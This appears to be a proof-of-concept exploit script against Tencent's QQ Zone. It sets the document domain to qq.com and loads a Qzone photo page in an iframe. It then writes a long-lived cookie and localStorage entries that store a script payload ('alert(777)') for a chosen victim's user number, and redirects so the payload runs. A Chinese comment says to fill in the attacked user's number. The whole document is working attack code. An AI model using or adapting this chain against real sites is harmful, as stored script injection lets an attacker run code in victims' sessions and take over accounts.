document.domain="qq.com";
var UIN = 1708442189;
// uin填被攻击者的uin，比如想在123456的qq空间上弹就填123456
var a = document.createElement("iframe");
a.src = "https://rc.qzone.qq.com/proxy/domain/qzs.qq.com/qzone/photo/v7/page/photo.html?init=photo.v7/module/photoList2/index&navBar=1";
a.name = "g_iframeDescend";
document.body.appendChild(a);
a.onload = function () {
    // top.qzone_proxy.alert(1);
    top.g_iframeDescend.document.cookie = "v6uin=" + UIN.toString() + "; domain=qq.com;expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/";
    top.g_iframeDescend.localStorage.setItem("qzonev6musicstate1", ",,,199999999999,xxx");
    top.g_iframeDescend.localStorage.setItem("qzonev6music" + UIN.toString(), "alert(777)");
    setTimeout("location.href='https://rc.qzone.qq.com/'", 2000);
}